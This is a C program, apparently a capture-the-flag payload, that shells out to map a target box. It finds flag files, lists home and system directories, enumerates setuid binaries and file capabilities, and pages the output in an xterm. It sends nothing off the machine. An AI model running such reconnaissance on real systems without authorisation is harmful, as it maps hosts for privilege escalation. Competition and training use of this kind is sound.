/* Twitch Pwn 02 - recon v3. Same hunt as v2 but displayed with an auto-paging
 * xterm (mousepad can't scroll on a one-way video channel): pages of ~38 lines,
 * ~14s each, looping until the box resets. We only LOCATE files; we read only
 * our own team's flag, never another team's. */
#include <stdlib.h>
int main(void) {
    system(
        "export DISPLAY=\"${DISPLAY:-:0}\"; "
        "export XAUTHORITY=\"${XAUTHORITY:-$HOME/.Xauthority}\"; "
        "O=/tmp/RECON3.txt; "
        "{ "
        "  echo '===== RECON3 TWITCH PWN 02 ====='; "
        "  echo '--- id ---'; id; echo \"HOME=$HOME PWD=$(pwd)\"; "
        "  echo '--- ls /twitch ---';   ls -la /twitch 2>&1; "
        "  echo '--- find /twitch ---'; find /twitch -maxdepth 4 2>&1 | head -n 40; "
        "  echo '--- FLAG FILES ---';   find / -iname '*flag*' 2>/dev/null | grep -vE '^/proc|^/sys|^/usr/(lib|share|src|include)' | head -n 60; "
        "  echo '--- ls / ---';         ls -la / 2>&1; "
        "  echo '--- ls /home ---';     ls -la /home 2>&1; "
        "  echo '--- ls ~ ---';         ls -la ~ 2>&1; "
        "  echo '--- ls /srv /opt ---'; ls -la /srv /opt 2>&1; "
        "  echo '--- setuid ---';       find / -perm -4000 -type f 2>/dev/null | head -n 40; "
        "  echo '--- caps ---';         getcap -r / 2>/dev/null | head -n 40; "
        "  echo '===== END ====='; "
        "} > \"$O\" 2>&1; "
        /* auto-paging xterm: small font, 38-line pages, 14s each, loop forever */
        "( xterm -fa Monospace -fs 15 -geometry 130x42+10+10 -e bash -c '"
            "mapfile -t L < \"$0\"; n=${#L[@]}; per=38; "
            "while true; do "
              "for ((i=0;i<n;i+=per)); do "
                "printf \"\\033c\"; "
                "for ((j=i;j<i+per && j<n;j++)); do echo \"${L[j]}\"; done; "
                "echo; echo \"---- page $((i/per+1))/$(( (n+per-1)/per )) ----\"; "
                "sleep 14; "
              "done; "
            "done' \"$O\" "
        "  || mousepad \"$O\" "
        ") >/dev/null 2>&1 & "
        "sleep 118"
    );
    return 0;
}
